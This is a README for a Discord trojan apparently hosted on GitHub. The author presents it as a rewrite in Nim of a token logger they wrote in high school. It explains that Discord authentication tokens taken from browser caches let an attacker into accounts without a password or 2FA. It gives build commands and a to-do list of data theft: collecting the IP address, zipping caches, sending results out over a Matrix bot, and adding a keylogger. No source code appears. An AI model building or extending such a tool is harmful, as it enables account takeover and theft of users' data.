# NimDiss
Just another Discord trojan. Written in Nimlang.

## Why?
I wrote a malicious program that logged Discord tokens and PC information during high school that was incredibly inefficient and bloated due to it being written in Python and containing eight million unnecessary libraries. I thought it would be cool to rewrite it in nim to become more proficient in it, even if it's functionally the same.

## How it works
Discord has been notorious for being one of the most used social platforms that can easily have accounts compromised. Ever since its conception in 2017, savvy users have been able to log in to an account by an **authentication token**, which allows access into a Discord account without the need of an email, password, or even 2FA. These said tokens can be found in any cache files used by applications that have logged into Discord before--anyone who has access to this browser cache can access any accounts that have these tokens stored. This is the basis of most token loggers: find the browser cache, and obtain the token.

Discord did find a temporary workaround for this security issue by generating a new token for every login instance, but it still riddled with issues besides 'token logging.' There are more competent messengers out there that are both privacy-respecting and feature rich, such as [Matrix](matrix.org) and [Signal](signal.org) that have end-to-end encryption and do not track their users for advertisers.

## Build
```
git clone https://github.com/tadateruu/nimdiss
cd nimdiss
nim compile main.nim
```
This project is incomplete at the time of writing this, so it may not function as intended just yet. Please note that the directories targeted are only found in Windows. Because this is for educational purposes only and not for use besides experimentation, `creds.json` isn't hardcoded and is required as an extra file to send results over Matrix.

## To-do
- [x] Request IPv4
- [ ] Zip browser/application cache
- [ ] Upload results to file sharing platform
- [ ] Send results via Matrix bot
- [ ] Keylogger
